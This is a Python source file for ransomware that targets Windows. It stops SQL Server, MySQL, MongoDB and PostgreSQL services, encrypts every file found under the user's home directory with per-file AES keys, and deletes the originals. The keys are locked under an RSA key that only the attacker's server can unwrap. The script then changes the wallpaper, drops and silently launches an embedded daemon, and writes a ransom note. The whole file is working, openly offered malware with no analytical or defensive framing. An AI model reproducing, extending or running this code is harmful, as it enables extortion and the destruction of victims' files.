import variables
import asymmetric
import get_files
import symmetric
import environment
import generate_keys
import utils

import os
import string
import random
import base64
import pickle
import gc
import subprocess
import ctypes
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes


def kill_databases():
    if utils.amiroot():  # Use Windows admin check
        # Stop SQL Server
        os.system('net stop MSSQLSERVER /y >nul 2>&1')
        # Stop MySQL
        os.system('net stop MySQL /y >nul 2>&1')
        # Stop MongoDB
        os.system('net stop MongoDB /y >nul 2>&1')
        # Stop PostgreSQL
        os.system('net stop postgresql-x64-14 /y >nul 2>&1')


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]
    
    # Load the key for cryptography library
    server_public_key = serialization.load_pem_public_key(key)
    
    encrypted = []
    for i in x:
        ciphertext = server_public_key.encrypt(
            i,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted.append(ciphertext)
    return encrypted


def encrypt_file(file_info, extensions_map, result_queue):
    found_file = file_info
    try:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file_bytes = base64.b64decode(found_file)
        found_file_str = found_file_bytes.decode('utf-8')

        # Read file content
        with open(found_file_bytes, 'rb') as f:
            file_content = f.read()
            
        # Get original file path, name and extension
        file_path, file_name = os.path.split(found_file_str)
        file_base, file_ext = os.path.splitext(file_name)
        
        # Add extension information to file content (for decryption)
        header = f"ORIGINAL_EXT:{file_ext[1:] if file_ext.startswith('.') else file_ext};".encode('utf-8')
        file_content_with_header = header + file_content
        
        # Encrypt the file with header
        encrypted = AES_obj.encrypt(file_content_with_header)
        
        # Delete the original file instead of shredding
        os.remove(found_file_bytes)
        
        # Create new filename with malware extension
        new_file_name = os.path.join(file_path, file_base + ".Z434M4")
        
        # Store the mapping between encrypted filename and original extension
        extensions_map[new_file_name] = file_ext
        
        # Write encrypted file
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        # Add to the list for key storage
        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
        result_queue.put((key, base64_new_file_name))
        
    except Exception as e:
        print(f"Error processing {found_file}: {str(e)}")

def start_encryption(files):
    # Shared resources
    extensions_map = {}  # Dictionary to store original extension mappings
    extensions_file_path = os.path.join(variables.ransomware_path, "file_extensions.dat")
    result_queue = queue.Queue()
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(extensions_file_path), exist_ok=True)
    
    # Load existing extensions file if it exists
    try:
        if os.path.exists(extensions_file_path):
            with open(extensions_file_path, 'rb') as ext_file:
                extensions_map = pickle.load(ext_file)
    except:
        pass
    
    # Create a thread-safe extensions map using a lock
    extensions_lock = threading.Lock()
    
    # Define a thread-safe version of encrypt_file
    def encrypt_file_thread_safe(file):
        try:
            key = generate_keys.generate_key(128, True)
            AES_obj = symmetric.AESCipher(key)
            
            found_file_bytes = base64.b64decode(file)
            found_file_str = found_file_bytes.decode('utf-8')

            # Read file content
            with open(found_file_bytes, 'rb') as f:
                file_content = f.read()
                
            # Get original file path, name and extension
            file_path, file_name = os.path.split(found_file_str)
            file_base, file_ext = os.path.splitext(file_name)
            
            # Add extension information to file content (for decryption)
            header = f"ORIGINAL_EXT:{file_ext[1:] if file_ext.startswith('.') else file_ext};".encode('utf-8')
            file_content_with_header = header + file_content
            
            # Encrypt the file with header
            encrypted = AES_obj.encrypt(file_content_with_header)
            
            # Delete the original file instead of shredding for speed
            os.remove(found_file_bytes)
            
            # Create new filename with malware extension
            new_file_name = os.path.join(file_path, file_base + ".Z434M4")
            
            # Store the mapping between encrypted filename and original extension
            with extensions_lock:
                extensions_map[new_file_name] = file_ext
            
            # Write encrypted file
            with open(new_file_name, 'wb') as f:
                f.write(encrypted)

            # Return the result
            base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
            return (key, base64_new_file_name)
            
        except Exception as e:
            print(f"Error processing file: {str(e)}")
            return None
    
    # Use ThreadPoolExecutor for parallel encryption
    AES_and_base64_path = []
    max_workers = min(32, os.cpu_count() * 2)  # Limit threads to avoid system overload
    
    print(f"Starting encryption with {max_workers} threads")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all file encryption tasks
        future_to_file = {executor.submit(encrypt_file_thread_safe, file): file for file in files}
        
        # Process results as they complete
        for future in as_completed(future_to_file):
            result = future.result()
            if result:
                AES_and_base64_path.append(result)
    
    print(f"Encrypted {len(AES_and_base64_path)} files")
    
    # Save the extensions map
    with open(extensions_file_path, 'wb') as ext_file:
        pickle.dump(extensions_map, ext_file)
    
    # Encrypt the extensions file for extra security
    try:
        with open(extensions_file_path, 'rb') as f:
            ext_file_content = f.read()
        
        # Use a new key for extensions file
        ext_key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(ext_key)
        encrypted_ext = AES_obj.encrypt(ext_file_content)
        
        # Replace the plain file with encrypted version
        with open(extensions_file_path + ".Z434M4", 'wb') as f:
            f.write(encrypted_ext)
            
        # Remove original extensions file
        os.remove(extensions_file_path)
        
        # Store the extensions file key for decryption
        AES_and_base64_path.append((ext_key, base64.b64encode((extensions_file_path + ".Z434M4").encode('utf-8'))))
    except Exception as e:
        print(f"Error encrypting extensions file: {str(e)}")
    
    return AES_and_base64_path


def menu():
    try:
        os.makedirs(variables.test_path, exist_ok=True)  # Windows-friendly directory creation
    except OSError:
        pass

    kill_databases()
        
    files = get_files.find_files(os.path.expanduser('~'))  # Use Windows home directory
    
    print(f"Found {len(files)} files to encrypt")

    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key.encode('utf-8'))
    
    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.encrypted_client_private_key_path), exist_ok=True)
    
    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)
    
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    client_public_key_object = serialization.load_pem_public_key(Client_public_key)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    
    # Process encryption results in parallel
    enc_aes_key_and_base64_path = []
    
    def encrypt_aes_key(item):
        aes_key, base64_path = item
        
        # Convert key to bytes if it's a string
        if isinstance(aes_key, str):
            aes_key = aes_key.encode('utf-8')

        encrypted_aes_key = client_public_key_object.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return (encrypted_aes_key, base64_path)
    
    # Use ThreadPoolExecutor for parallel AES key encryption
    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        # Submit all key encryption tasks
        future_to_key = {executor.submit(encrypt_aes_key, item): item for item in aes_keys_and_base64_path}
        
        # Process results as they complete
        for future in as_completed(future_to_key):
            result = future.result()
            if result:
                enc_aes_key_and_base64_path.append(result)
    
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.aes_encrypted_keys_path), exist_ok=True)
    
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1].decode('utf-8') + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_daemon_and_decryptor():
    # Ensure directories exist
    os.makedirs(os.path.dirname(variables.decryptor_path), exist_ok=True)
    
    with open(variables.decryptor_path, 'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path, 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    # Start the daemon process
    subprocess.Popen([variables.daemon_path], shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    menu()
    utils.change_wallpaper()
    drop_daemon_and_decryptor()
    # Create ransom note
    utils.create_ransom_note()